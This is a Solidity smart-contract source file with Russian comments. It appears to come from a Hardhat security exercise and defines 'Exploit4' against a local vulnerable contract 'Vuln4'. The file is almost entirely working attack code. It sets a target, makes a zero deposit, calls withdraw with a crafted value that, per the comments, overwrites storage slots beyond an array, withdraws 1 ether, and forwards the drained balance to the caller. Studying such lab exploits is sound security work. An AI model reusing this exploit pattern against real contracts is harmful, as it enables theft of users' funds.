// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.8;


import "hardhat/console.sol";

import "./Vuln4.sol";



contract Exploit4 {

    address private owner;
    Vuln4 public vulnerableContract;
    event WithdrawEvent (address, uint);
    constructor () payable {

        // запоминаем кто задеплоил эксплоит
        owner = msg.sender;
    }

    //перешлём
    receive() external payable {
       
        vulnerableContract.deposit{value: 0}();
        return;
       
    }

    
    modifier OnlyOwner () {
        require(msg.sender == owner, "OnlyOwner");
        _;
    }

    // Сюда нужно передать адрес нужного контракта Vuln3.
    function InitExploit3 (address target) public payable OnlyOwner {
        vulnerableContract = Vuln4(target);
        
    }
    
    
    //кладём небольшой депозит и забираем больше
    //amount == arrRef[0]
    function attack() public payable {
        ////vulnerableContract.deposit{value: 1 wei}();
        ////vulnerableContract.withdraw(2 wei); //история по ошибке добавляет 1 wei к балансу при каждой операции
        
        
        uint256 f = 2;
        

       
        
        console.log("magic value f %x %d", f, f);

        //vulnerableContract.withdraw(1);
        //попробуем получить больше выгоды
        //переполнеие следующих слотов за arrRef[0]
        vulnerableContract.deposit{value: 0}();
        vulnerableContract.withdraw(f);

        //утянем 1 эфира
        vulnerableContract.withdraw(1 ether);

        console.log("Get mapping %d", mapLocation(0, address(this)));
        
        

    }

    function mapLocation(uint256 slot, address key)
    public
    pure
    returns (uint256) {
        return uint256(keccak256(abi.encode(key, slot)));
    }


    function getEther() public {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

   
}